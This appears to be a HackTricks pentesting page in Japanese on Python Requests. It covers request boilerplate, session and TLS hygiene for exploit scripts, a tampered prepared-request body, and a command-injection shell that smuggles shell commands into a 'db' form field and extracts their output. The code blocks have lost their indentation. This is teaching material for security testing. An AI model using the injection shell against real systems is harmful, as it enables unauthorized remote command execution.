# Webリクエスト

{{#include ../../banners/hacktricks-training.md}}

## Python Requests

これらの例では、Requestsのドキュメントに記載されたリクエスト引数、レスポンスプロパティ、multipartファイルタプル、セッションを使用します。<sup>[[1]](#references)</sup> `verify=False`の例ではTLS証明書の検証を無効にするため、管理されたテスト環境に限定して使用してください。<sup>[[1]](#references)</sup>
```python
import random
import re
import string

import requests

url = "http://example.com:80/some/path.php"
params = {"p1":"value1", "p2":"value2"}
headers = {"User-Agent": "fake User Agent", "Fake header": "True value"}
cookies = {"PHPSESSID": "1234567890abcdef", "FakeCookie123": "456"}
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

#Regular Get requests sending parameters (params)
gr = requests.get(url, params=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True)

code = gr.status_code
ret_headers = gr.headers
body_byte = gr.content
body_text = gr.text
ret_cookies = gr.cookies
is_redirect = gr.is_redirect
is_permanent_redirect = gr.is_permanent_redirect
float_seconds = gr.elapsed.total_seconds()

#Regular Post requests sending parameters (data)
pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

#Json Post requests sending parameters(json)
pr = requests.post(url, json=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

#Post request sending a file(files) and extra values
filedict = {"<FILE_PARAMETER_NAME>" : ("filename.png", open("filename.png", 'rb').read(), "image/png")}
pr = requests.post(url, data={"submit": "submit"}, files=filedict)

#Useful for presenting results in boolean/time based injections
print(f"\rflag: {flag}{char}", end="")




##### Example Functions
target = "http://10.10.10.10:8000"
proxies = {}
s = requests.Session()

def register(username, password):
resp = s.post(target + "/register", data={"username":username, "password":password, "submit": "Register"}, proxies=proxies, verify=0)
return resp

def login(username, password):
resp = s.post(target + "/login", data={"username":username, "password":password, "submit": "Login"}, proxies=proxies, verify=0)
return resp

def get_info(name):
resp = s.post(target + "/projects", data={"name":name, }, proxies=proxies, verify=0)
guid = re.match('<a href="\/info\/([^"]*)">' + name + '</a>', resp.text)[1]
return guid

def upload(guid, filename, data):
resp = s.post(target + "/upload/" + guid, data={"submit": "upload"}, files={"file":(filename, data)}, proxies=proxies, verify=0)
guid = re.match('"' + filename + '": "([^"]*)"', resp.text)[1]
return guid

def json_search(guid, search_string):
resp = s.post(target + "/api/search/" + guid + "/", json={"search":search_string}, headers={"Content-Type": "application/json"}, proxies=proxies, verify=0)
return resp.json()

def get_random_string(guid, path):
return ''.join(random.choice(string.ascii_letters) for i in range(10))
```
## ペイロード制御のための Prepared request

`PreparedRequest` は、送信前の最終的な URL、headers、encoded body を公開します。session cookies または authentication を適用する必要がある場合は、`Request.prepare()` ではなく `Session.prepare_request()` を使用して構築します。prepared-flow でも環境の proxy/CA settings を適用する必要がある場合は、`merge_environment_settings()` で明示的に統合します。<sup>[[1]](#references)</sup>
```python
s = requests.Session()
req = requests.Request("POST", url, data=b"role=user")
prepped = s.prepare_request(req)
prepped.body = b"role=admin%26debug%3D1"
prepped.headers["Content-Length"] = str(len(prepped.body))

env = s.merge_environment_settings(prepped.url, {}, None, None, None)
r = s.send(prepped, timeout=(3.05, 15), allow_redirects=False, **env)
print(r.request.headers)
print(r.request.body)
```
これは、exploit で標準外の encoding が必要な場合や、構築した payload と `response.request` に保存された request を比較する場合に便利です。これは raw-HTTP primitive ではありません。Requests は headers を大文字と小文字を区別しない mapping として保存するため、同じ名前を代入すると以前の値が置き換えられます。Malformed な request line や、[HTTP request-smuggling tests](../../pentesting-web/http-request-smuggling/README.md) で必要となる個別の重複した `Content-Length`/`Transfer-Encoding` フィールドを扱うには、より低レベルの sender を使用してください。<sup>[[1]](#references)</sup>

## Session の分離、暗黙の credentials、TLS state

Session はデフォルトで環境設定を信頼します。明示的な authentication が指定されていない場合、Requests は `.netrc` から Basic credentials を取得することがあります。また、環境変数から proxy 設定や CA bundle のパスを取り込むこともあります。攻撃者が制御する URL を取得する script では、これらの暗黙的な入力を無効にし、意図した lab proxy/CA のみを明示的に設定してください。2.32.4 より前の release では、悪意を持って細工された URL が指定された場合に、誤った host 用の `.netrc` credentials が選択される可能性がありました。upgrade が不可能な場合は、`Session.trust_env = False` が documented workaround です。<sup>[[1]](#references)[[4]](#references)</sup>
```python
s = requests.Session()
s.trust_env = False
s.verify = "/path/to/lab-ca.pem"  # Prefer a lab CA over verify=False
s.proxies = {
"http": "http://127.0.0.1:8080",
"https": "http://127.0.0.1:8080",
}
```
`verify=False`を使用するsessionは、検証済みTLSを要求するsessionとは分離してください。Requests 2.32.0より前では、`verify=False`で最初に開かれたconnectionが、その後のリクエストで`verify=True`が指定されていても、同じoriginへのリクエストで再利用される可能性がありました。アップグレードによりこのpool-stateの問題は修正されますが、分離することでexploit scriptの監査も容易になります。<sup>[[5]](#references)</sup>

## 信頼性の高いexploit loop

Requestsにはデフォルトのtimeoutがありません。`(connect, read)` timeoutは、wall-clock全体に対するdeadlineではありません。readコンポーネントは、受信したbytes間でclientが待機する時間を制限します。targetが`Location`を制御できる場合はautomatic redirectを無効にし、新しいリクエストを送信する前に各hopを検証してください。redirectを有効にしている場合は、`response.history`を確認します。大きいレスポンスや悪意のあるレスポンスには、`stream=True`を使用してbounded chunk単位で反復し、context managerでレスポンスをcloseして、pool内のconnectionが解放されるようにしてください。<sup>[[1]](#references)</sup>
```python
limit = 2 * 1024 * 1024
body = bytearray()

with s.get(url, timeout=(3.05, 10), allow_redirects=False, stream=True) as r:
print(r.status_code, r.headers.get("Location"))
for chunk in r.iter_content(64 * 1024):
if len(body) + len(chunk) > limit:
raise ValueError("response exceeds limit")
body.extend(chunk)
```
## RCEをexploitするPython cmd

コマンドループはPythonの`Cmd`をサブクラス化し、その`default`メソッドは認識されないコマンドプレフィックスを処理し、`cmdloop`は入力行をディスパッチし、`re.DOTALL`によって抽出パターンが改行をまたげるようになります。<sup>[[2]](#references)[[3]](#references)</sup>
```python
import requests
import re
from cmd import Cmd

class Terminal(Cmd):
prompt = "Inject => "

def default(self, args):
output = RunCmd(args)
print(output)

def RunCmd(cmd):
data = { 'db': f'lol; echo -n "MYREGEXP"; {cmd}; echo -n "MYREGEXP2"' }
r = requests.post('http://10.10.10.127/select', data=data)
page = r.text
m = re.search('MYREGEXP(.*?)MYREGEXP2', page, re.DOTALL)
if m:
return m.group(1)
else:
return 1


term = Terminal()
term.cmdloop()
```
## References

- [1] [Requests Developer Interface](https://requests.readthedocs.io/en/stable/api/)
- [2] [Python `cmd` — 行指向けコマンドインタープリターのサポート](https://docs.python.org/3/library/cmd.html)
- [3] [Python `re` — 正規表現の操作](https://docs.python.org/3/library/re.html)
- [4] [悪意のある URL による `.netrc` credentials leak に対して脆弱な Requests](https://github.com/psf/requests/security/advisories/GHSA-9hjg-9r4m-mvj7)
- [5] [最初のリクエストを `verify=False` で実行した後、Requests の `Session` object がリクエストを検証しない](https://github.com/psf/requests/security/advisories/GHSA-9wx4-h78v-vm56)
{{#include ../../banners/hacktricks-training.md}}
